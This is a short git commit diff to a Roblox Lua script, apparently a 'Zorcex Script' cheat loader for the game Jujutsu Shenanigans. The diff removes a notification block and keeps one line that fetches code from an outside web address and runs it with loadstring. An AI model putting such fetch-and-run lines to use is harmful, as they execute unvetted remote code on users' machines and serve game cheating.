411051e1e60d9eaa8260111b33fccd6d8ac13b5c
Hoàng Kim Tiến Đạt <thuykieu071980@gmail.com>
2026-09-12 21:32:24 +0700

    Update Jujutsu-Shenanigans.lua

--- Jujutsu-Shenanigans.lua
+++ Jujutsu-Shenanigans.lua
@@ -1,7 +1,1 @@
 loadstring(game:HttpGet("https://zorcex-script.web.app/Jujutsu-Shenanigans", true))()
-
-game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "Zorcex Script"
-    Text = "Loaded successfully!",
-    Duration = 5
-})
